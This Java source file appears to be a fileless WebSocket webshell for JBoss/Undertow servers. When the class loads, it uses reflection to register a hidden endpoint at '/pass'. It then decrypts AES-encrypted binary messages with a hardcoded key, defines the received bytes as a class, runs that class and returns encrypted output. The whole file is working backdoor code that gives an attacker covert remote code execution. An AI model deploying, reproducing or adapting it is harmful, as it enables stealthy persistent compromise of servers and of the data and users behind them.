import javax.servlet.ServletContext;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;
import java.util.HashSet;

public class AesJBossWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private Class payload = null;
    private Session session = null;
    private String xc = "3c6e0b8a9c15224a";
    private String pass = "pass";


    static {
        new AesJBossWebsocketShell();
    }

    public AesJBossWebsocketShell(){
        synchronized (lock){
            if (!initialized){
                initialized = true;
                try {
                    addEndpoint(this);
                }catch (Throwable ignored){

                }
            }
        }
    }

    public AesJBossWebsocketShell(Session session){
        this.session = session;
    }

    public static Object[] getContexts() throws Throwable {
        HashSet contexts = new HashSet();
        Object servletRequestContext = loadClassEx("io.undertow.servlet.handlers.ServletRequestContext").getMethod("current").invoke(null);
        Object currentServletContext= servletRequestContext.getClass().getMethod("getCurrentServletContext").invoke(servletRequestContext);
        contexts.add(currentServletContext);
        return contexts.toArray();
    }
    private boolean addEndpoint(Endpoint endpoint) throws Throwable {
        Object[] contexts = getContexts();

        boolean isOk = false;

        try {
            for (int i = 0; i < contexts.length; i++) {
                Object context = contexts[i];
                try {
                    ServletContext servletContext = (ServletContext) context;
                    int maxBinaryMessageBufferSize = 10485760;
                    String websocketPath = String.format("/%s",pass);
                    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(endpoint.getClass(),websocketPath).build();
                    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
                    Field deploymentCompleteField = getField(container,"deploymentComplete");
                    try {
                        try {
                            if (deploymentCompleteField!=null){
                                deploymentCompleteField.set(container,false);
                            }
                        }catch (Throwable e){

                        }

                        if (container.getDefaultMaxBinaryMessageBufferSize() < maxBinaryMessageBufferSize){
                            container.setDefaultMaxBinaryMessageBufferSize(maxBinaryMessageBufferSize);
                        }
                        container.addEndpoint(configEndpoint);

                        isOk = true;

                        if (deploymentCompleteField!=null){
                            deploymentCompleteField.set(container,true);
                        }

                    } catch (Throwable e) {
                    }
                } catch (Throwable e) {

                }
            }
        }catch (Throwable e){

        }



        return isOk;
    }

    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }

    static Class loadClassEx(String className) throws ClassNotFoundException{
        try {
            return Class.forName(className);
        } catch (Throwable e) {
            try {
                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
            } catch (Throwable ignored) {
                try {
                    Thread[] threads = new Thread[Thread.activeCount()];
                    Thread.enumerate(threads);
                    for (int i = 0; i < threads.length; i++) {
                        Thread thread = threads[i];
                        if (thread == null) {
                            continue;
                        }
                        try {
                            ClassLoader loader = thread.getContextClassLoader();
                            return loader.loadClass(className);
                        } catch (Throwable ignored2) {

                        }

                    }

                } catch (Throwable ignored2) {

                }
            }

        }
        throw new ClassNotFoundException(className);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }
    public byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    public void onOpen(Session session, EndpointConfig endpointConfig) {
        session.addMessageHandler(new AesJBossWebsocketShell(session));
    }

    private Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], AesJBossWebsocketShell.class.getClassLoader());
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        return (Class) defineClassMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public void onMessage(ByteBuffer byteBuffer) {
        try {
            int limit = byteBuffer.limit();
            byte[] data = new byte[limit];
            byteBuffer.get(data,0,limit);
            data = aes(data,false);
            byte[] response = new byte[0];
            if (payload == null) {
                payload = defClass(data);
            }else {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                Object obj = payload.newInstance();
                obj.equals(data);
                obj.equals(bos);
                obj.toString();
                response = bos.toByteArray();
            }
            session.getBasicRemote().sendBinary(ByteBuffer.wrap(aes(response,true)));
        }catch (Throwable e){
            try {
                session.close();
            } catch (IOException ex) {

            }
        }
    }
}
